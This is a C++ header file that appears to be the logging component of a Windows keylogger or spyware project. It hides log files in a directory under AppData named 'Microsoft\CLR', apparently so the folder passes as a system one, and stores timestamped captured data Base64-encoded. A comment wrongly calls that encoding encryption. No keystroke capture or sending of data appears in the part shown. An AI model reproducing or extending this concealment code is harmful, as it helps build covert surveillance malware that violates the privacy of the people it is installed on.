#ifndef IO_H
#define IO_H
#include <fstream>
#include <string>
#include <cstdlib>//used for get env function
#include "windows.h"//windows api
#include "Sec.h"
#include "Base64.h"

namespace IO//creating our own namespace
{
    std::string GetPath(const bool append_seperator = false)//checks if backslash needs to be added at the end of the path
    {
        //will get the env variable that contains the appdata directory path
        //get env - get environment, APPDATA - variable
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\":"");
        //the place where our log files will be stored
        //C:\Users\USERNAME\AppData\Roaming
    }
    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std::string path)
    {
        for(char &c : path)
            if(c=='\\')
        {
            c='\0';//making sure its null terminating
            if(!MkOneDr(path))//creating directory using path
                return false;//if MkOneDr returns false then return false
            c='\\';
        }
        return true;//return true when we are done with creating subdirectory
    }
    template <class T>
    std::string WriteLog(const T &t)//the function that will create the actual function, by date
    {
        std::string path = GetPath(true);
        Sec::DateTime dt;
        std::string name = dt.GetDateTimeString("_")+".log";

        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s<<"["<<dt.GetDateString() <<"]"<<
            std::endl<<t<<std::endl;
            std::string data = Base64::EncryptB64(s.str());//encrypting the file
            file<<data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }

}

#endif // IO_H
